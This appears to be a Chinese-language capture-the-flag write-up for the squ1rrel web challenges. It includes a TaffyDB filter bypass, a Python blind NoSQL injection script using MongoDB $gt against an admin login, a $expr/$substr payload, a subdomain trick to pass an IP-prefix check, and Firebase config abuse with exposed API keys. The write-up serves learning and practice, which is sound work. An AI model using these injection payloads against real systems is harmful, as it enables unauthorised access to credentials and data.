`https://ctf.squ1rrel.dev/login?token=s1pniGOFTCNbGpXBaH6TOnQHoHPmROX77Hag8pLcUTSXzEHayVkKRN0cUF7B6k%2BoUNGHOQwBeyNHoSmpE%2BqEOi1cVPDDG1fNtFosvy%2FlUdEhw4BNtLfxiifRmcbb`
# web
### web/JSON Store

俩个路由
```js
const db = TAFFY([
    {"username": "admin", "comments": process.env.FLAG},
    {"username": "randomuser", "comments": "This is a test comment"},
]);
```
导入了taffydb这个内存数据库,存入和读取json

| 路由 | 作用 |
| ---- | ---- |
| app.post("/getData", | 获取username,filters,设置 filters["username"]=username ;`const data = db(filters).get();`返回data |
| app.post("/addData",  | 获取username,data,插入data,设置`data["username"] = username;`<br> |
感觉应该在getData下,构造一个filters,读取到admin的commnents,但是由于中间件存在express.json(),强制json解析body,导致taffy原本的查询语法部分不能使用


破案了,在npm install的时候直接提示了一个高危漏洞...
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240505224755.png)

taffydb在查询时如果找到索引,就会忽略其他条件,直接返回索引数据项,然后构造,尝试id遍历即可

```json
{
    "filters": {
        "___id":"T000002R000002",
        "___s":"true"
    },
    "username": "a"
}
```

### web/Goosemon
flag在admin的用户密码里,数据库用的是mongodb

ban掉了关键字regex,防止正则表达式注入

看来需要盲注出admin的密码
```js
    const result = await data.toArray();
    if (result.length > 0) {
      res.status(200).send("Login successful!");
    } else {
      res.status(400).send("Login failed!");
    }
```
https://www.mongodb.com/docs/v6.0/reference/operator/query/gt/
mongodb的操作符,发现有gte(>=),可以盲注

但是盲注过程中有`regex`这个字符串,被filter函数过滤了
```js
const filter = (input) => {
    if (typeof input === 'string') {
        return input.toLowerCase().includes('regex');
    }
  
    if (typeof input === 'object') {
        return JSON.stringify(input).toLowerCase().includes('regex');
    }
}
```


```python
import requests

url="http://34.132.166.199:5249/login"

flag="squ1rrel{7h0ugh7_y0u_c0u1d_rege"

for i in range(1000):
    min=0
    max=127
    mid=(min+max)//2
    while max > min:
        mid = (min+max)//2
        data={
            "username": "admin",
            "password": {
                "$gt":flag+chr(mid)
            }
        }
        print(data)
        result=requests.post(url,json=data)
        if (result.status_code==400):
            max=mid
        else:
            min=mid+1
        mid = (min+max)//2
    flag+=chr(mid-1)
    print(flag)


```

切片,拼接在mongodb查询里也不能用...


---
别人用的是expr,gpt害我
```json
{'username': 'admin', "$expr": { "$eq": [ { "$substr": ["$password", i, 1] }, c ]}}
```

### web/Key Server
一个jwt校验,公钥可以从url中读取,
```js
    if (!issuer.host.startsWith("10.")) {
        return res.status(401).send("Invalid IP address");
    }
```
https://dnsexit.com/domains/free-second-level-domains/
host是主机名不是ip,可以申请一个免费的二级域名 `10.publicvm.com`

本地通了,远程不行...

### web/mutex-lock
```js
app.put("/mutex/:name", (req, res) => {
    const { name } = req.params;
    if (mutexes[name] == undefined) {
        const uuid = crypto.randomUUID();
        mutexes[name] = uuid;
        return res.status(200).send("Acquired! Password to release: " + uuid);
    } else {
        return res.status(409).send("Mutex already acquired");
    }
});

app.delete("/mutex/:name", (req, res) => {
    const { name } = req.params;
    const pwd = req.query.pwd;
    if (mutexes[name] == undefined) {
        return res.status(404).send("Mutex not found");
    }

    if (mutexes[name] == pwd) {
        delete mutexes[name];
        return res.status(200).send("Mutex released.");
    } else {
        return res.status(403).send("Invalid password -- do you control this mutex?");
    }
});


```

很简单的代码,flag在环境变量里,但是这俩个路由也没有可以读flag的地方啊...

---

出题者修改了express的来源,指向了他的仓库,进去之后看commit
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240506181958.png)

![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240509105214.png)


### web/Personal Website
https://squ1rrel.dev/squ1rrel-personal-website
一个简单的博客,什么也没有

---
通过wappalyzer可以看到是使用了firebase,并且图片也是用的这个存储
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240509105639.png)

firebase是谷歌的云主机NoSQL数据库

https://firebase.google.com/docs/hosting/reserved-urls?hl=zh-cn
可以发现,初始配置在`/__/firebase/init.json`中,可以读取apikey
```json
{
  "apiKey": "AIzaSyAlUQ9NC6P-KiEVPuwD9X6rwuZwB1lcvd4",
  "authDomain": "my-personal-website-a.firebaseapp.com",
  "databaseURL": "https://my-personal-website-a-default-rtdb.firebaseio.com",
  "messagingSenderId": "415548456803",
  "projectId": "my-personal-website-a",
  "storageBucket": "my-personal-website-a.appspot.com"
}
```

```js
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, getDocs } from 'firebase/firestore/lite';
import { getStorage ,list ,ref } from 'firebase/storage';
import {getAuth,createUserWithEmailAndPassword} from 'firebase/auth';
// TODO: Replace the following with your app's Firebase project configuration
const firebaseConfig = {
   "apiKey": "AIzaSyAlUQ9NC6P-KiEVPuwD9X6rwuZwB1lcvd4",
  "authDomain": "my-personal-website-a.firebaseapp.com",
  "databaseURL": "https://my-personal-website-a-default-rtdb.firebaseio.com",
  "messagingSenderId": "415548456803",
  "projectId": "my-personal-website-a",
  "storageBucket": "my-personal-website-a.appspot.com"
};

const app = initializeApp(firebaseConfig);

const auth = getAuth();
await createUserWithEmailAndPassword(auth, "kjiel@user.com", "password");

const storage = getStorage(app);
const data = await list(ref(storage, "/"))
console.log(data)
```

提示网络错误,,,


# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-05-05   22:39